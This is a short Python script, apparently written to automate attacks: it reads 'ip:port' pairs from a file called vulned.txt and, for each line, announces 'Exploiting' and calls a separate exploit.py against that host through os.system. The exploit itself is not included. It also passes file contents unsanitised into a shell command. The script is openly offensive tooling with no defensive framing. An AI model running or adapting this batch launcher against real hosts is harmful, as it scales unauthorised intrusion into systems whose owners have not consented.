#code writed by https://github.com/weryfy
import os
handle=open("./vulned.txt","r")
ip=''
port=''
for x in handle:
        ip=x.split(':')[0]
        port=x.split(':')[1]
        print('[*]Exploiting %s:%s...'%(ip, port))
        os.system('python3 ./exploit.py -ip %s -p %s'%(ip, port))
